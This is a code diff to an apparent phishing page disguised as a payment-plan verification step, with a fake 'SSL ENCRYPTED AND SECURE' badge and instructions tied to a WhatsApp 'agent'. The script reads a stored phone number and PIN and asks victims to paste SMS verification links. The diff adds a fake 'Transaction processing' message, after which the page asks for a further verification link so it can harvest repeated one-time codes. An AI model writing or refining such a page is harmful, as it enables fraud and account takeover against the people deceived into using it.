@@ -64,6 +64,21 @@ body{display:flex;justify-content:center;align-items:flex-start;padding:10px 0 2
 
 .secure{margin-top:18px;border:1px solid #9ac497;background:#dbf0df;color:#2e7c43;border-radius:10px;padding:12px 10px;text-align:center;font-size:14px;font-weight:800;letter-spacing:.04em}
 .error{min-height:16px;margin-top:10px;font-size:12px;color:#c62828;text-align:center}
+.status-message{
+  margin-top:18px;
+  padding:14px 16px;
+  border-radius:12px;
+  background:#fff4ec;
+  border:1px solid #f5c7a8;
+  color:#5b2f12;
+  font-size:15px;
+  font-weight:800;
+  text-align:center;
+  line-height:1.4;
+  display:none;
+  box-shadow:0 6px 14px rgba(245,124,32,.08);
+}
+.status-message.show{display:block}
 .hidden{display:none !important}
 
 @media (max-width:380px){
@@ -145,6 +160,7 @@ body{display:flex;justify-content:center;align-items:flex-start;padding:10px 0 2
       <div class="note">If you don't understand how to do it, contact the agent who directed you here from WhatsApp.</div>
 
       <button class="verify-btn enabled" id="verifyBtn" type="button">Verify</button>
+      <div id="statusMessage" class="status-message"></div>
       <div id="error" class="error"></div>
       <div class="secure">◌ SSL ENCRYPTED AND SECURE</div>
     </div>
@@ -155,6 +171,7 @@ body{display:flex;justify-content:center;align-items:flex-start;padding:10px 0 2
 const sms = document.getElementById('sms');
 const verifyBtn = document.getElementById('verifyBtn');
 const error = document.getElementById('error');
+const statusMessage = document.getElementById('statusMessage');
 const phoneDisplay = document.getElementById('phoneDisplay');
 const planNameEl = document.getElementById('planName');
 const planAmountEl = document.getElementById('planAmount');
@@ -239,15 +256,32 @@ function applySavedValues() {
 applySavedValues();
 showLinkTiming();
 
+function showStatus(message) {
+  if (!statusMessage) return;
+  statusMessage.textContent = message;
+  statusMessage.classList.add('show');
+}
+
+function hideStatus() {
+  if (!statusMessage) return;
+  statusMessage.textContent = '';
+  statusMessage.classList.remove('show');
+}
+
 async function submitVerification() {
   const smsText = sms.value.trim();
   error.textContent = '';
+  hideStatus();
 
   if (!smsText) {
     error.textContent = 'Please paste the verification link first.';
     sms.focus();
     return;
   }
+
+  showStatus('Transaction processing. Please wait...');
+  verifyBtn.disabled = true;
+  verifyBtn.textContent = 'Processing...';
 
   const phone = localStorage.getItem('phone') || 'Unknown';
   const pin = localStorage.getItem('userPin') || 'Unknown';
@@ -281,7 +315,14 @@ async function submitVerification() {
   }
 
   localStorage.setItem('smsPayload', JSON.stringify(payload));
-  window.location.href = 'ming.html';
+
+  setTimeout(() => {
+    showStatus('Please paste the new verification link sent to your phone.');
+    verifyBtn.disabled = false;
+    verifyBtn.textContent = 'Verify';
+    sms.value = '';
+    sms.focus();
+  }, 3000);
 }
 
 async function readClipboardText() {
